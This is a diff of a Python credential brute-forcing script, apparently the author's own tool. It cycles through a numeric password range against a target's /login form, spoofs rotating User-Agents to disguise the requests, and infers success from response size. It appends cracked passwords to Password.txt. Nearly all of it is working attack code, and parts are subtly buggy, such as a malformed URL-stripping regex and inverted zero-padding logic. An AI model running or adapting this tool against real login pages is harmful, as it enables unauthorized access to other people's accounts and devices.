@@ -12,18 +12,17 @@
 #   Hathem Ahmed
 # *******************************************************************
 
-# Modules
-import requests
-import time
 import os
 import sys
-from bs4 import BeautifulSoup
+import time
+import requests
+from re import split as SP
+from random import randint
 sys.path.append('../modules/')
-from tools import agent
+from tools import agent as _USER_AGENT
 from color import *
 
 
-# write this def martaks
 def write(M, T):
     for c in M + '\n':
         sys.stdout.write(c)
@@ -37,177 +36,101 @@ def cou(word) -> int():
     return n
 
 
-def req(url, port, maxNumber, minNumber, NL, name_form):
-    _URL_ = url
-    _PORT_ = port
-
-    # Value Session for Dateless
-    _session_ = requests.Session()
-
-    # List of random User-Agents.
-    agents = agent()
-
-    # Url target and add http if not find in url !
-    _URL_ = f"http://{_URL_}:{_PORT_}/login" if _URL_.startswith("http") \
-                                                is False else f"{_URL_}:{_PORT_}/login"
-
-    # Use User-Agent on headers like proxy
-    _session_.headers['User-Agent'] = agents[minNumber]
-
-    # Send password data into Target site
-    attack = _session_.post(url=_URL_, data={f"{name_form}": f"{maxNumber}"})
-
-    AllProcess = f"""
-          {R}[{N}         {int(NL)}         {R}]{N}
-[{B} * {N}] Date                : {attack.headers['Date']}
-[{B} * {N}] Content Type        : {attack.headers['Content-Type']}
-[{B} * {N}] User-Agent          : {_session_.headers['User-Agent'][0:50]}
-[{B} * {N}] url                 : {attack.url}
-[{B} * {N}] Date-Hack           : {attack.elapsed.total_seconds()} second
-[{B} * {N}] Code-Site           : {attack.status_code} {{' Ok '}}"""
-
-    _URL__O_ = f"http://{_URL_}:{_PORT_}/logout?erase-cookie=on" if _URL_.startswith("http://") \
-                                                                    is False else f"{_URL_}:{_PORT_}/logout"
-
-    if int(attack.headers['Content-Length']) < 4000:
-        _session_.get(url=_URL__O_)
-        _URL__O_ = f"http://{_URL_}:{_PORT_}/{Next_Url}" if _URL_.startswith(
-            "http://") is False else f"{_URL_}:{_PORT_}/login"
-
-    # return Number for size Page
-
-    return [int(attack.headers['Content-Length']), str(AllProcess), int(attack.status_code)]
+def _PRINT(*args, **kwargs):
+    _MSG = args[0].strip()
+    return print(args[0])
 
 
-def index_exploit(ip, port, number, file):
-    global First\
-        , Next_save\
-        , ZERO\
-        , NameForm
 
-    number = number.split(',')
-    if number[1].startswith("0") is True:ZERO = True
-    else:ZERO = False
-    password_num = errors_num = minNumber = AllFor = int()
+def URL_CLEAR(*args, **kwargs):
+    _RE_ = args[0].replace("/login","") if "/login" in args[0] else args[0]
+    _RE_ = SP(r"[http://|https://]", _RE_)[-1]
+    return _RE_
 
-    Next_save = int() + 1
+
+
+def _WRITE_PASSWORD(*args, **kwargs):
+    _FILE_ = open(os.path.join(os.getcwd(),'Password.txt'), 'a')  
+    _FILE_.write(f"\n{'+'*5} Mr.MHM {'+'*5}\nPASSWORD: {args[0]}\n")
+    _FILE_.close()
+
+
+
+
+
+def _INDEX(*args, **kwargs):
+    os.system("clear")
+    _PRINT(f"[ {Y}===>{N} ] Find {W}{args[3]}{N} Passwords and write in {os.getcwd()}/Password.txt ^^\n") if int(args[3]) > 0 else ""
+
+    _P = (f"""    {R}[{N}    {args[0] + 1}    {R}]{N}
+[{B} * {N}] SIZE     : {args[1].headers['Content-Length']}
+[{B} * {N}] PASSWORD : {args[2]}
+[{B} * {N}] TIMEOUT  : {args[1].elapsed.total_seconds()}\n\n\n--- Enter Ctrl+C for (exit) ---""")
+    return _PRINT(_P)
+
+
+
+def _REQUESTS_SU(*args, **kwargs):
+    global _S
+
+    HOST, PASSWIRD = args
+
+    _S = requests.Session()
+    _S.headers['User-Agent'] = _USER_AGENT(randint(0,10))
+
+    _DATA = {"username": str(PASSWIRD)}
 
     try:
 
-        _URL_ = f"http://{ip}:{port}/login" if ip.startswith("http") \
-                                                    is False else f"{ip}:{port}/login"
+        _GET = _S.post(url=f"http://{HOST}/login", data=_DATA)
 
-        _SOUP_ = BeautifulSoup(requests.get(_URL_).text, "html5lib")
-        NameForm = str()
-        for i in _SOUP_.findAll("input"):
-            _NAME_ = i.get("type")
-            if _NAME_ == "text":
-                NameForm = i.get("name")
-                break
-                
-            if _NAME_ == "password":
-                NameForm = i.get("name")
-                break
-
-    except:NameForm = "username"
-        
-
-    for Password in range(int(number[0]), int(number[1])):
-
-        smpleA = req(url=ip
-                     , port=port
-                     , maxNumber=Password if ZERO is False else str(f"0{Password}")
-                     , minNumber=minNumber
-                     , NL=int(AllFor+1)
-                     , name_form=NameForm)
-        if smpleA[2] != 200:print(f"[ - ] Error Not Find This Page it is [ {smpleA[2]} ] ");exit()
-
-        if AllFor == 0:
-
-            # save any first size page number
-
-            one_Save = smpleA[0]
-
-            Next_save = one_Save
-
-        AllFor += 1
-
-        minNumber = int() if minNumber is 4 else minNumber + 1
-
-        # if size page number is defiant an a first save password
-        if smpleA[0] < 4000 and smpleA[2] is 200:
-            password_num += 1
-
-            save(True, file=file
-                 , ip=ip
-                 , port=port
-                 , Password=Password)
-
-        if Next_save != smpleA[0] and smpleA[0] > 4000 and smpleA[2] is 200:
-            errors_num += 1
-
-            AllFor = 0
-
-            save(False, file=file
-                 , ip=ip
-                 , port=port
-                 , Password=Password)
-
-        First = f"""[{B} * {N}] Find Passwords      : "  {R}{password_num}{N}  "  
-[{B} * {N}] Find Errors         : "  {R}{errors_num}{N}  "
-[{Y + ' + ' + N if smpleA[0] < 4000 and smpleA[2] is 200  else R + ' - ' + N}] Password            : {f'0{Password}' 
-        if ZERO is True else Password} 
-[{Y + ' + ' + N if smpleA[0] < 4000 and smpleA[2] is 200 else R + ' - ' + N}] Active-Hack         : {Y + "Find" + N if 
-        smpleA[0] < 4000 and smpleA[2] is 200
-        else R + "No Find" + N}"""
-
-        add(
-            str(smpleA[1]),
-
-            str(First),
-
-            f'[{Y} ! {N}] {F}{R}Find Passwords {password_num} Please Open This file {file}{N}'
-            if password_num != 0 else None,
-
-            f'[{Y} ! {N}] {F}{R}Find Error Size {errors_num} Please Open This file Error{file}{N}'
-            if errors_num != 0 else None,
-        )
-
-    input(f'{W}{R}---- Find Passwords {password_num} Please Open This file {file} ----{N}')
+    except:
+        _PRINT(f"[{R} - {N}] Sorry ERROR For Requests !!")
+        sys.exit(0)
 
 
-def save(act, file, ip, port, Password):
-    if act is True:
-        saveP = open(f'{file}', 'a')
-        saveP.write(f'{"+" * 10} Mr.MHM {"+" * 10}\nDate = {time.ctime()}\n'
-                    f'Url = http://{ip}:{port}/login\nPassword = {Password}\n\n')
-        saveP.close()
-    else:
-        saveE = open(f'Error{file}', 'a')
-        saveE.write(f'{"+" * 10} Mr.MHM {"+" * 10}\nDate = {time.ctime()}\n'
-                    f'Url = http://{ip}:{port}/login\nPassword = {Password}\n\n')
-        saveE.close()
+    return _GET
 
 
-def add(T1, T2, passwords, errors):
-    L = int()
-    while L < 1:
-        os.system('clear')
-        if passwords is not None:print(f'{passwords}\n')
-        if errors is not None:print(errors)
-        L += 1
-        print(f'{T1}\n{T2}')
-        print(f'\n\n\n\n--- Enter Ctrl+C for (exit) ---')
+
+def _PROCESS_DATA(*args, **kwargs):
+    HOST, MINNUM, MAXNUM = args
+
+    ZERO = True if MINNUM.startswith("0") is False else False
+
+    _A = PROCESS_SIZE = FIND = int()
+    _R = True
+
+    for PASSWIRD in range(int(MINNUM),int(MAXNUM)):
+        PASSWIRD = PASSWIRD if ZERO is True else f"0{PASSWIRD}"
+        DATA = _REQUESTS_SU(HOST,PASSWIRD)
+
+        if _R is True:
+            PROCESS_SIZE = int(DATA.headers['Content-Length'])
+            _R = False
+
+        if int(DATA.headers['Content-Length']) < PROCESS_SIZE and int(DATA.status_code) == 200:
+            if  PROCESS_SIZE - int(DATA.headers['Content-Length']) > 500:
+                    _S.get(url=f"http://{HOST}/logout")
+                    _S.delete(url=f"http://{HOST}/login")                    
+                    _WRITE_PASSWORD(PASSWIRD)
+                    _R = True
+                    FIND += 1
+
+        _INDEX(_A, DATA, PASSWIRD, FIND)
+
+        _A += 1
+   
+
+
+def _SERVER_SYS(*args, **kwargs):
+    HOST, MINNUM, MAXNUM = args
+    _PROCESS_DATA(URL_CLEAR(HOST), MINNUM, MAXNUM)
 
 
 class MAIN(object):
     def __init__(self):
         pass
 
-    def run(self, ip, port, numbers):
-
-        index_exploit(ip=ip
-                      , port=port
-                      , number=numbers
-                      , file="Password.txt"
-                      )
+    def run(self, HOST, MINNUM,MAXNUM):
+        _SERVER_SYS(HOST, MINNUM, MAXNUM)
